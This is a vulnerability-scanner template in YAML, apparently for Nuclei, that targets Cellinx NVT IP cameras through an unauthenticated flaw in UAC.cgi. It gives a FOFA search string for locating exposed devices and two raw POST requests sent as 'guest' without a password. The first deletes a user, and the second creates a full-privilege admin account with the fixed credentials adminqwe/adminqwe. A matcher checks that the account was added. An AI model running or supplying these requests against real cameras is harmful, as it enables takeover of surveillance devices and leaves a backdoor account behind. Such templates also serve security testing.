id: cellinx-nvt-uac-unauth
info:
  name: cellinx-nvt-uac-unauth
  author: unknow
  severity: high
  description: cellinx 摄像机 uac.cgi 存在未授权添加用户漏洞。
  tags: cellinx,unauth
  metadata:
    fofa-query: body="local/NVT-string.js"

http:
  - raw:
      - |
        POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
        Host: 
        Content-Type: application/json; charset=UTF-8
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        {"jsonData":{"username":"guest","password":"","option":"delete_user","data":{"username":"{{username}}"}}}
      - |
        POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
        Host: 
        Content-Type: application/json; charset=UTF-8
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        {"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"{{username}}","password":"{{password}}","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}

    attack: clusterbomb      
    payloads:
      username:
        - adminqwe
      password:
        - adminqwe

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2==200 && contains(body_2, "add_user\":{\"result\" : \"Success\"}}}") && contains(header_2, "application/json")'